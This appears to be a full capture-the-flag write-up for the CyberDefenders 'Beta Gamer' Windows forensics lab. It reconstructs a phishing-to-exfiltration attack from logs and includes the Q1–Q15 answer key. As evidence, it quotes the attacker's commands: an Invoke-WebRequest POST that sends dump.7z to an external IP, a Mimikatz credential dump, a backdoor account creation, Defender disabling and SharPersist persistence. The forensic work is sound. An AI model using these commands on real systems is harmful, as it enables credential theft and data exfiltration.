# CyberDefenders — Beta Gamer Lab: Full Writeup

> **Platform:** CyberDefenders
> **Category:** Windows Endpoint Forensics
> **Difficulty:** Medium
> **Score:** 15/15
> **Host:** `EC2AMAZ-KJUI6D1` (AWS EC2, Windows Server 2022)

---

## Table of Contents

1. [Scenario](#scenario)
2. [Evidence Overview](#evidence-overview)
3. [Environment Setup](#environment-setup)
4. [Step-by-Step Solving Guide](#step-by-step-solving-guide)
   - [Phase 1: Parse All EVTX Logs](#phase-1-parse-all-evtx-logs)
   - [Phase 2: Extract Email Evidence](#phase-2-extract-email-evidence)
   - [Phase 3: Extract Browser History](#phase-3-extract-browser-history)
   - [Phase 4: Analyze Sysmon Logs](#phase-4-analyze-sysmon-logs)
   - [Phase 5: Analyze Security Logs](#phase-5-analyze-security-logs)
   - [Phase 6: Analyze Defender Logs](#phase-6-analyze-defender-logs)
   - [Phase 7: Analyze PowerShell History](#phase-7-analyze-powershell-history)
5. [Attack Flow](#attack-flow)
6. [Full Attack Timeline](#full-attack-timeline)
7. [Answers (Q1–Q15)](#answers-q1q15)
8. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
9. [Grep Cheatsheet](#grep-cheatsheet)
10. [Lessons Learned](#lessons-learned)

---

## Scenario

A developer using the alias `neo-gamer` is working on a Windows EC2 instance. They receive a phishing email about a fake GTA VI beta download. They take the bait, download and execute a malicious installer, which establishes a C2 connection back to the attacker. From there, the attacker stages tools, escalates privileges, creates a backdoor admin account, dumps credentials with Mimikatz, disables Windows Defender, archives sensitive data with 7-Zip, and exfiltrates it via HTTP POST.

**Kill Chain Summary:**

```
Phishing Email
    └──> Malicious Download (GTAVI_Installer_x64.exe)
            └──> C2 Beacon (3.147.237.39:3388)
                    └──> Tool Staging (winPEAS, SharPersist, Mimikatz, PsExec)
                            └──> Privilege Escalation (trojanized Dir_hash.ps1)
                                    └──> Persistence (SharPersist scheduled tasks)
                                            └──> Credential Dumping (notkatz.exe / Mimikatz)
                                                    └──> Defender Tampering (registry modification)
                                                            └──> Backdoor Account (MS-Defender-Admin)
                                                                    └──> Data Staging (7-Zip archives)
                                                                            └──> Exfiltration (HTTP POST to C2)
```

---

## Evidence Overview

The triage image contains the following key evidence sources:

| Source | Path | What It Tells Us |
|--------|------|------------------|
| Sysmon Operational EVTX | `Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx` | Process creation, network connections, file creation, registry changes, Zone.Identifier |
| Security EVTX | `Windows/System32/winevt/Logs/Security.evtx` | Logon events, account creation |
| Defender Operational EVTX | `Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx` | Malware detections, actions taken |
| PowerShell Operational EVTX | `Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx` | Script block logging |
| Thunderbird mbox | `Users/neo-gamer/AppData/Roaming/Thunderbird/Profiles/*/ImapMail/*/INBOX` | Phishing email content |
| Chrome History DB | `Users/neo-gamer/AppData/Local/Google/Chrome/User Data/Default/History` | Download URLs |
| PSReadLine History | `Users/MS-Defender-Admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt` | Attacker's exfiltration commands |

---

## Environment Setup

### Prerequisites

```bash
# Install python-evtx for EVTX parsing on Linux
pip install evtx

# Install sqlite3 if not already available (for Chrome History)
sudo apt install sqlite3
```

### Extract the Evidence

```bash
# Extract the provided archive (adjust filename as needed)
mkdir -p ~/beta-gamer && cd ~/beta-gamer
unzip BetaGamer.zip -d evidence/
# or: 7z x BetaGamer.zip -o evidence/
```

### Create an Output Directory

```bash
mkdir -p ~/beta-gamer/parsed
```

---

## Step-by-Step Solving Guide

### Phase 1: Parse All EVTX Logs

This is the most critical step. Parse every EVTX file into flat text for easy grep-based searching.

```python
#!/usr/bin/env python3
"""parse_evtx.py — Bulk EVTX parser for forensic triage."""
import json, glob, os
from evtx import PyEvtxParser

src = "evidence/Windows/System32/winevt/Logs"
out_dir = "parsed"

for path in glob.glob(src + "/*.evtx"):
    name = os.path.basename(path).replace(".evtx", "").replace("%4", "_")
    with open(f"{out_dir}/{name}.txt", "w") as out:
        try:
            for r in PyEvtxParser(path).records_json():
                d = json.loads(r["data"])["Event"]
                e = d["System"]["EventID"]
                e = e["#text"] if isinstance(e, dict) else e
                data = d.get("EventData") or d.get("UserData") or {}
                if isinstance(data, dict):
                    flat = " | ".join(f"{k}={v}" for k, v in data.items())
                else:
                    flat = str(data)
                out.write(f"{r['timestamp']} EID={e} | {flat}\n")
        except Exception as ex:
            print(f"[!] Failed: {name} — {ex}")

print("[+] All EVTX files parsed into", out_dir)
```

Run it:

```bash
python3 -I parse_evtx.py
```

This produces one `.txt` file per EVTX log. The key files you will reference throughout the lab:

- `parsed/Microsoft-Windows-Sysmon_Operational.txt` → referred to as **sysmon.txt**
- `parsed/Security.txt` → referred to as **security.txt**
- `parsed/Microsoft-Windows-Windows Defender_Operational.txt` → referred to as **defender.txt**
- `parsed/Microsoft-Windows-PowerShell_Operational.txt` → referred to as **powershell.txt**

For convenience:

```bash
cd parsed
ln -s Microsoft-Windows-Sysmon_Operational.txt sysmon.txt
ln -s Security.txt security.txt
ln -s "Microsoft-Windows-Windows Defender_Operational.txt" defender.txt
ln -s Microsoft-Windows-PowerShell_Operational.txt powershell.txt
```

---

### Phase 2: Extract Email Evidence

The phishing email is stored in Thunderbird's mbox file. Search for the phishing sender and subject.

```bash
# Find the INBOX mbox file
find evidence/ -path "*/Thunderbird/*" -name "INBOX" 2>/dev/null

# Search for the phishing email
grep -i "From:.*gamer\|Subject:.*GTA\|Subject:.*beta" \
  evidence/Users/neo-gamer/AppData/Roaming/Thunderbird/Profiles/*/ImapMail/*/INBOX

# Extract full email headers and body
grep -A 30 "Subject:.*GTA" \
  evidence/Users/neo-gamer/AppData/Roaming/Thunderbird/Profiles/*/ImapMail/*/INBOX
```

**What to look for:**
- `From:` header → phishing sender email address
- `Subject:` header → context of the lure
- Body → any URLs or instructions given to the victim

**Result:** Sender is `gamerhelp@mail2tor.com`, subject is "Re: Download GTA VI Beta Not Working"

---

### Phase 3: Extract Browser History

The victim downloaded the malicious file through Chrome. The download URL is in the Chrome History SQLite database.

```bash
# Find the Chrome History DB
find evidence/ -name "History" -path "*/Chrome/*" 2>/dev/null

# Copy it (SQLite needs write access for WAL)
cp evidence/Users/neo-gamer/AppData/Local/Google/Chrome/User\ Data/Default/History /tmp/ChromeHistory

# Query download URLs
sqlite3 /tmp/ChromeHistory <<'SQL'
.headers on
.mode column
SELECT
    d.id,
    d.tab_url,
    d.target_path,
    duc.url AS download_url,
    datetime(d.start_time / 1000000 - 11644473600, 'unixepoch') AS start_time
FROM downloads d
LEFT JOIN downloads_url_chains duc ON d.id = duc.id
ORDER BY d.start_time;
SQL
```

**What to look for:**
- Any download with `GTAVI` in the path or URL
- The `downloads_url_chains` table holds the actual source URL (which may differ from `tab_url`)

**Result:** Download URL is `https://0xguts.github.io/GTAVI_Installer_x64.exe`

You can cross-validate with Sysmon EID 15 (Zone.Identifier / Mark of the Web):

```bash
grep "EID=15.*GTAVI" sysmon.txt
```

---

### Phase 4: Analyze Sysmon Logs

Sysmon is the richest evidence source. Work through it systematically by Event ID.

#### 4a. Process Creation (EID 1) — Find the attacker's tools

```bash
# What did the installer spawn?
grep "EID=1.*GTAVI" sysmon.txt

# Find all executables run from the attacker's tool directory
grep "EID=1.*GTAVI_Game_Temp" sysmon.txt

# List unique tool names
grep -oP 'Image=\S+' sysmon.txt | grep -i "GTAVI_Game_Temp" | sort -u
```

**Result:** Attacker tool directory is `C:\Users\neo-gamer\AppData\GTAVI_Game_Temp`. Tools found:
- `winPEASx64.exe` (enumeration)
- `SharPersist.exe` (persistence)
- `UpdateCheck.exe` (C2 beacon)
- `ps.exe` (PsExec)
- `PrivescCheck.ps1` (privilege escalation check)
- `notkatz.exe` (Mimikatz, renamed)

#### 4b. Network Connections (EID 3) — Find C2 communications

```bash
# All outbound connections from the installer
grep "EID=3.*GTAVI_Installer" sysmon.txt

# All connections to external IPs (exclude local/AWS metadata)
grep "EID=3" sysmon.txt | grep -v "169.254\|127.0.0\|10\.\|172\.16" | head -30

# Specifically look for the C2 IP across all processes
grep "EID=3.*3.147.237.39" sysmon.txt
```

**Result:** C2 IP:port is `3.147.237.39:3388`. Later, exfiltration uses port `8888` on the same IP.

#### 4c. Persistence — SharPersist

```bash
# Find SharPersist executions
grep -i "SharPersist" sysmon.txt

# Find scheduled task creation
grep -i "schtask\|System Update" sysmon.txt
```

**Result:** SharPersist created multiple persistence mechanisms:
- Scheduled task: `-t schtask -c "...UpdateCheck.exe" -n "System Update" -m add -o logon`
- Registry run key: `-t hkcurun`
- Startup folder: `-t startupfolder`

#### 4d. Privilege Escalation — Trojanized Script

```bash
# Find Dir_hash.ps1 execution
grep -i "Dir_hash" sysmon.txt

# Find who was added to Administrators
grep -i "net localgroup.*Admin" sysmon.txt

# Find the file modification event
grep "EID=11.*Dir_hash" sysmon.txt
```

**Result:** `C:\Users\neo-gamer\Documents\Dir_hash.ps1` was modified by the attacker at 2024-12-13 13:47:32. When it ran as the `dev` user via a scheduled task, it executed `net localgroup Administrators neo-gamer /add` and then launched `UpdateCheck.exe`.

#### 4e. Binary Masquerading — yara64.exe

```bash
# Find all yara64.exe executions and compare hashes
grep "EID=1.*yara64" sysmon.txt
```

**Result:** `yara64.exe` was run twice with different MD5 hashes:
- **Legitimate:** `MD5=87D9F8077C0B741CB888C9EDA3F01552` (ran from cmd.exe interactively)
- **Replaced:** `MD5=ADEE7FC8EFB7FCD12F1F12A040402462` (ran from svchost.exe/Schedule at High integrity, connected to C2)

#### 4f. Account Creation

```bash
# Find net user commands
grep "EID=1.*net user\|EID=1.*net.exe.*user" sysmon.txt

# Find net localgroup commands
grep "EID=1.*net localgroup" sysmon.txt
```

**Result:** `net user MS-Defender-Admin Passw0rd1237 /add` — backdoor admin account created.

#### 4g. Defender Tampering

```bash
# Find registry modification disabling Defender
grep -i "DisableRealtimeMonitoring\|Real-Time Protection" sysmon.txt
```

**Result:** At 2024-12-13 16:05:46 UTC, registry key `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring` was set to `DWORD (0x00000001)` via Sysmon EID 13.

#### 4h. Data Staging — 7-Zip

```bash
# Find 7-Zip activity
grep -i "7z\|7zG" sysmon.txt | grep "EID=1"
```

**Result:** Two directories were archived by `MS-Defender-Admin`:
1. `C:\Users\neo-gamer\AppData\Local\Thunderbird`
2. `C:\Users\MS-Defender-Admin\Documents\Defender Temp Files`

#### 4i. Zone.Identifier — Files Downloaded Under New Account

```bash
# Find downloads by MS-Defender-Admin
grep "EID=15.*MS-Defender-Admin" sysmon.txt
```

**Result:** `7z2409-x64.exe` and `python-3.13.1-amd64.exe` were downloaded via Chrome by the `MS-Defender-Admin` account.

---

### Phase 5: Analyze Security Logs

```bash
# Account creation events
grep "EID=4720" security.txt

# Logon events for the backdoor account
grep "MS-Defender-Admin" security.txt | grep "4624"

# Look for the source IP of attacker logon
grep "4624.*MS-Defender-Admin" security.txt
```

**What to look for:**
- EID 4720 → Account creation timestamp and creator
- EID 4624 → Logon type (3 = network), source IP, workstation name

**Result:** Attacker logged in from `18.116.26.227` using NTLM V2, LogonType=3, workstation `DESKTOP-1HTKTGB`.

---

### Phase 6: Analyze Defender Logs

```bash
# All detections
grep "EID=1116" defender.txt

# Actions taken on detections
grep "EID=1117" defender.txt

# Specifically look for Mimikatz and Meterpreter
grep -i "Mimikatz\|Meterpreter\|HackTool" defender.txt
```

**Result:**
- `HackTool:Win64/Meterpreter.A!dll` detected at 2024-12-13 14:52:01
- `HackTool:Win32/Mimikatz.I` detected at **2024-12-13 15:06:55** (notkatz.exe running `privilege::debug sekurlsa::logonpasswords exit`)

---

### Phase 7: Analyze PowerShell History

```bash
# Read PSReadLine history for the backdoor account
cat evidence/Users/MS-Defender-Admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
```

**What to look for:**
- Exfiltration commands (Invoke-WebRequest, curl, etc.)
- Archive filenames
- Destination IP/port

**Result:** `Invoke-WebRequest -Uri 3.147.237.39:8888 -Method POST -InFile "dump.7z"` — the final exfiltration command sending `dump.7z` to the C2.

---

## Attack Flow

```
                         INITIAL ACCESS
                              │
                    Phishing email from
                  gamerhelp@mail2tor.com
                 (fake GTA VI beta invite)
                              │
                              ▼
                         EXECUTION
                              │
              neo-gamer downloads & runs
         GTAVI_Installer_x64.exe from
           0xguts.github.io via Chrome
                              │
                              ▼
                    COMMAND & CONTROL
                              │
              Installer beacons to C2
                  3.147.237.39:3388
                              │
                              ▼
                      TOOL STAGING
                              │
          Attacker drops tools into
     C:\Users\neo-gamer\AppData\GTAVI_Game_Temp\
     ├── winPEASx64.exe    (enumeration)
     ├── SharPersist.exe   (persistence)
     ├── UpdateCheck.exe   (C2 beacon)
     ├── ps.exe            (PsExec)
     ├── PrivescCheck.ps1  (privesc check)
     └── notkatz.exe       (Mimikatz)
                              │
                              ▼
                  PRIVILEGE ESCALATION
                              │
        ┌─── Trojanize Dir_hash.ps1 ───┐
        │  (runs as 'dev' user via      │
        │   scheduled task, adds        │
        │   neo-gamer to Admins)        │
        └───────────────────────────────┘
                              │
          Replace yara64.exe with beacon
          (runs as SYSTEM via schtask)
                              │
                              ▼
                       PERSISTENCE
                              │
          SharPersist creates:
          ├── Scheduled task "System Update"
          ├── HKCU Run key
          └── Startup folder entry
                              │
                              ▼
                  CREDENTIAL DUMPING
                              │
          notkatz.exe (Mimikatz)
          privilege::debug
          sekurlsa::logonpasswords exit
                              │
                              ▼
                   DEFENSE EVASION
                              │
          Disable Defender Real-Time Protection
          (Registry: DisableRealtimeMonitoring=1)
                              │
                              ▼
                     LATERAL ACCESS
                              │
          Create backdoor account:
          net user MS-Defender-Admin Passw0rd1237 /add
                              │
          Attacker logs in from 18.116.26.227
          (NTLM V2, DESKTOP-1HTKTGB)
                              │
                              ▼
                    DATA STAGING
                              │
          Downloads 7z2409-x64.exe & Python
          Archives with 7-Zip:
          ├── Thunderbird mailbox
          └── Defender Temp Files
          → Merged into dump.7z
                              │
                              ▼
                     EXFILTRATION
                              │
          Invoke-WebRequest -Uri 3.147.237.39:8888
            -Method POST -InFile "dump.7z"
```

---

## Full Attack Timeline

| # | Timestamp (UTC) | Event | Evidence Source |
|---|-----------------|-------|----------------|
| 1 | 2024-12-12 15:29:42 | neo-gamer downloads `GTAVI_Installer_x64.exe` from `0xguts.github.io` via Chrome | Chrome History + Sysmon EID 15 |
| 2 | 2024-12-12 15:30:39 | Installer beacons to C2 `3.147.237.39:3388` | Sysmon EID 3 |
| 3 | 2024-12-12 15:41:22 | `winPEASx64.exe` runs enumeration (queries EC2 metadata) | Sysmon EID 1 |
| 4 | 2024-12-13 13:04:48 | Installer re-beacons after reboot | Sysmon EID 3 |
| 5 | 2024-12-13 13:47:32 | `Dir_hash.ps1` modified (trojanized) by attacker via cmd.exe | Sysmon EID 11 |
| 6 | 2024-12-13 14:09:58 | Trojanized `Dir_hash.ps1` executes as `dev` → adds neo-gamer to Admins | Sysmon EID 1 |
| 7 | 2024-12-13 14:52:01 | Defender detects Meterpreter (`HackTool:Win64/Meterpreter.A!dll`) | Defender EID 1116 |
| 8 | 2024-12-13 15:04:43 | `yara64.exe` first run (legit hash) | Sysmon EID 1 |
| 9 | 2024-12-13 15:06:55 | Defender detects Mimikatz (`notkatz.exe`) | Defender EID 1116 |
| 10 | 2024-12-13 15:08:14 | `net user MS-Defender-Admin Passw0rd1237 /add` | Sysmon EID 1 |
| 11 | 2024-12-13 15:13:29 | `ps.exe` (PsExec) runs `whoami` | Sysmon EID 1 |
| 12 | 2024-12-13 15:50:41 | SharPersist creates "System Update" scheduled task | Sysmon EID 1 |
| 13 | 2024-12-13 16:04:18 | Replaced `yara64.exe` (new hash) runs from schtask, connects to C2 | Sysmon EID 1 + EID 3 |
| 14 | 2024-12-13 16:05:46 | Defender Real-Time Protection disabled via registry | Sysmon EID 13 |
| 15 | 2024-12-13 16:19:46 | MS-Defender-Admin logs in from `18.116.26.227` (NTLM V2) | Security EID 4624 |
| 16 | 2024-12-13 16:24:41 | `7zG.exe` archives Thunderbird directory | Sysmon EID 1 |
| 17 | 2024-12-13 16:25:18 | `7zG.exe` archives Defender Temp Files directory | Sysmon EID 1 |
| 18 | 2024-12-13 16:32:36 | `python-3.13.1-amd64.exe` downloaded via Chrome | Sysmon EID 15 |
| 19 | 2024-12-13 16:34:06 | PowerShell exfils `dump.7z` to `3.147.237.39:8888` | PSReadLine + Sysmon EID 3 |

---

## Answers (Q1–Q15)

### Q1. What is the email address of the phishing sender?

**`gamerhelp@mail2tor.com`**

- **Source:** Thunderbird INBOX mbox, `From:` header
- **How:** `grep -i "From:.*gamer" evidence/.../INBOX`
- The email subject was "Re: Download GTA VI Beta Not Working"

---

### Q2. What is the URL from which the malicious file was downloaded?

**`https://0xguts.github.io/GTAVI_Installer_x64.exe`**

- **Source:** Chrome History `downloads_url_chains` table
- **How:** SQLite query on the Chrome History DB joining `downloads` and `downloads_url_chains`
- Cross-validated with Sysmon EID 15 Zone.Identifier `HostUrl`

---

### Q3. What is the directory path where attacker tools were stored?

**`C:\Users\neo-gamer\AppData\GTAVI_Game_Temp`**

- **Source:** Sysmon EID 1 and EID 11
- **How:** `grep "EID=1.*GTAVI_Game_Temp" sysmon.txt`
- Tools found: winPEASx64.exe, SharPersist.exe, UpdateCheck.exe, ps.exe, PrivescCheck.ps1, notkatz.exe

---

### Q4. What is the C2 IP and port used by the dropper?

**`3.147.237.39:3388`**

- **Source:** Sysmon EID 3
- **How:** `grep "EID=3.*GTAVI_Installer" sysmon.txt`
- `GTAVI_Installer_x64 (1).exe` → `DestinationIp=3.147.237.39`, `DestinationPort=3388`

---

### Q5. What tool was used to create scheduled task persistence?

**`SharPersist.exe`**

- **Source:** Sysmon EID 1
- **How:** `grep -i "SharPersist" sysmon.txt`
- Commands: `-t schtask -c "...UpdateCheck.exe" -n "System Update" -m add -o logon`
- Also used `-t hkcurun` and `-t startupfolder` for redundancy

---

### Q6. What is the name of the backdoor account created?

**`MS-Defender-Admin`**

- **Source:** Sysmon EID 1 + Security EID 4720
- **How:** `grep "net user.*add" sysmon.txt`
- Command: `net user MS-Defender-Admin Passw0rd1237 /add`

---

### Q7. What script was modified for privilege escalation?

**`C:\Users\neo-gamer\Documents\Dir_hash.ps1`**

- **Source:** Sysmon EID 1 + EID 11
- **How:** `grep -i "Dir_hash" sysmon.txt`
- Modified at 2024-12-13 13:47:32 by cmd.exe. When executed as `dev` user via scheduled task, it ran `net localgroup Administrators neo-gamer /add` then launched `UpdateCheck.exe`

---

### Q8. What binary was replaced to execute as SYSTEM?

**`yara64.exe`**

- **Source:** Sysmon EID 1
- **How:** `grep "EID=1.*yara64" sysmon.txt` — compare MD5 hashes between runs
- Legit hash: `MD5=87D9F8077C0B741CB888C9EDA3F01552` (interactive cmd.exe)
- Replaced hash: `MD5=ADEE7FC8EFB7FCD12F1F12A040402462` (from svchost.exe/Schedule at High integrity)
- The replaced binary connected to C2 `3.147.237.39:3388`

---

### Q9. When was Mimikatz detected (UTC)?

**`2024-12-13 15:06:55`**

- **Source:** Defender EID 1116
- **How:** `grep -i "Mimikatz" defender.txt`
- Detection: `HackTool:Win32/Mimikatz.I`
- CmdLine: `notkatz.exe privilege::debug sekurlsa::logonpasswords exit`

---

### Q10. When was Defender Real-Time Protection disabled (UTC)?

**`2024-12-13 16:05:46`**

- **Source:** Sysmon EID 13 (RuleName=T1089,Tamper-Defender)
- **How:** `grep -i "DisableRealtimeMonitoring" sysmon.txt`
- Registry: `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = DWORD (0x00000001)`

---

### Q11. What is the source IP of the attacker's login?

**`18.116.26.227`**

- **Source:** Security EID 4624
- **How:** `grep "4624.*MS-Defender-Admin" security.txt`
- LogonType=3 (Network), NTLM V2, WorkstationName=`DESKTOP-1HTKTGB`
- Timestamp: 2024-12-13 16:19:46 UTC

---

### Q12. What files were downloaded under the new account?

**`7z2409-x64.exe, python-3.13.1-amd64.exe`**

- **Source:** Sysmon EID 15 (Zone.Identifier)
- **How:** `grep "EID=15.*MS-Defender-Admin" sysmon.txt`
- 7z from 7-zip.org, Python from python.org — both downloaded via Chrome

---

### Q13. What directories were archived with 7-Zip?

**`Thunderbird, Defender Temp Files`**

- **Source:** Sysmon EID 1
- **How:** `grep "7zG.*EID=1" sysmon.txt`
- Archives created by MS-Defender-Admin:
  1. `C:\Users\neo-gamer\AppData\Local\Thunderbird`
  2. `C:\Users\MS-Defender-Admin\Documents\Defender Temp Files`

---

### Q14. What is the final archive filename?

**`dump.7z`**

- **Source:** PSReadLine `ConsoleHost_history.txt`
- **How:** `cat evidence/.../ConsoleHost_history.txt`
- Used in: `Invoke-WebRequest -Uri 3.147.237.39:8888 -Method POST -InFile "dump.7z"`

---

### Q15. What is the exfiltration destination IP and port?

**`3.147.237.39:8888`**

- **Source:** PSReadLine history + Sysmon EID 3
- **How:** `grep "8888" sysmon.txt` and reading the PSReadLine history
- PowerShell (MS-Defender-Admin) sent `dump.7z` via HTTP POST to `3.147.237.39:8888`

---

## MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|-----------|----|----------|
| Phishing: Spearphishing Link | T1566.002 | `gamerhelp@mail2tor.com` → `0xguts.github.io` |
| User Execution: Malicious File | T1204.002 | `GTAVI_Installer_x64.exe` executed by victim |
| Command and Control | T1071 | TCP connection to `3.147.237.39:3388` |
| Scheduled Task/Job | T1053.005 | SharPersist → "System Update" task |
| Account Manipulation | T1098 | `Dir_hash.ps1` → `net localgroup Admins neo-gamer /add` |
| Create Account: Local | T1136.001 | `net user MS-Defender-Admin Passw0rd1237 /add` |
| OS Credential Dumping | T1003 | `notkatz.exe` (Mimikatz) `sekurlsa::logonpasswords` |
| Impair Defenses: Disable or Modify Tools | T1562.001 | `DisableRealtimeMonitoring=1` in registry |
| Archive Collected Data: Archive via Utility | T1560.001 | `7zG.exe` → `dump.7z` |
| Exfiltration Over C2 Channel | T1041 | `Invoke-WebRequest` → `3.147.237.39:8888` |
| Masquerading | T1036 | `yara64.exe` replaced with C2 beacon |
| Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | SharPersist `-t hkcurun` |

---

## Grep Cheatsheet

Quick reference for finding key evidence in the parsed logs:

```bash
# ── C2 connections ──
grep "EID=3.*GTAVI_Installer\|EID=3.*UpdateCheck\|EID=3.*yara64" sysmon.txt

# ── All connections to C2 IP ──
grep "3.147.237.39" sysmon.txt

# ── Persistence mechanisms ──
grep -i "SharPersist\|schtask.*System Update" sysmon.txt

# ── Account creation & logon ──
grep "MS-Defender-Admin" security.txt | grep "4720\|4724\|4624"

# ── Credential dumping detections ──
grep -i "Mimikatz\|Meterpreter\|HackTool" defender.txt

# ── Defender tampering ──
grep -i "DisableRealtimeMonitoring\|Real-Time Protection" sysmon.txt

# ── 7-Zip archiving ──
grep "7zG.*EID=1" sysmon.txt

# ── Exfiltration ──
grep "8888\|dump\.7z" sysmon.txt

# ── Privilege escalation ──
grep -i "Dir_hash\|net localgroup.*Admin" sysmon.txt

# ── Binary masquerading ──
grep "EID=1.*yara64" sysmon.txt

# ── Tool staging directory ──
grep "GTAVI_Game_Temp" sysmon.txt | grep "EID=1" | head -20

# ── Zone.Identifier (all downloads with Mark of the Web) ──
grep "EID=15" sysmon.txt
```

---

## Lessons Learned

### Forensic Methodology

1. **Parse all EVTX first.** Bulk-parsing into flat text files lets you grep freely and correlate across log sources. This single step answers 80% of questions.
2. **Sysmon is king.** EID 1 (process create), EID 3 (network), EID 11 (file create), EID 13 (registry), and EID 15 (Zone.Identifier) together reconstruct the full attack chain.
3. **Don't forget PSReadLine.** Attackers often forget to clear PowerShell command history. It directly reveals exfiltration commands.
4. **Cross-validate across sources.** The download URL appears in Chrome History AND Sysmon EID 15. The account creation appears in Sysmon EID 1 AND Security EID 4720. Multi-source confirmation increases confidence.
5. **Hash comparison catches masquerading.** The same filename (`yara64.exe`) with two different MD5 hashes is a dead giveaway of binary replacement.

### Detection Opportunities

- **Sysmon + hash monitoring** would catch the `yara64.exe` replacement immediately
- **Defender was working** — it detected both Meterpreter and Mimikatz, but the attacker disabled it before exfiltration
- **Network monitoring** for unusual outbound connections (port 3388, port 8888) to EC2 IPs would flag the C2
- **Account creation alerts** (Security EID 4720) with naming patterns mimicking legitimate services (`MS-Defender-Admin`) are a strong signal
- **PSReadLine logging** is enabled by default in modern PowerShell — a valuable evidence source attackers often overlook
